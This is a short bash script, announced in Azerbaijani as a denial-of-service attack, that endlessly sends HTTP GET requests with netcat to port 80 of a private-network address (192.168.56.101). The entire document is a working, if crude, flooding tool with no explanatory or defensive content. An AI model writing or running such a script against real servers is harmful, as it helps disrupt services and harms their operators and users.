#!/bin/bash

target="192.168.56.101"
port="80"

echo "[*] DOS hucumu başliyir: $target:$port"

while true; do
  {
    echo -e "GET / HTTP/1.1\r\nHost: $target\r\n\r\n"
  } | nc $target $port
done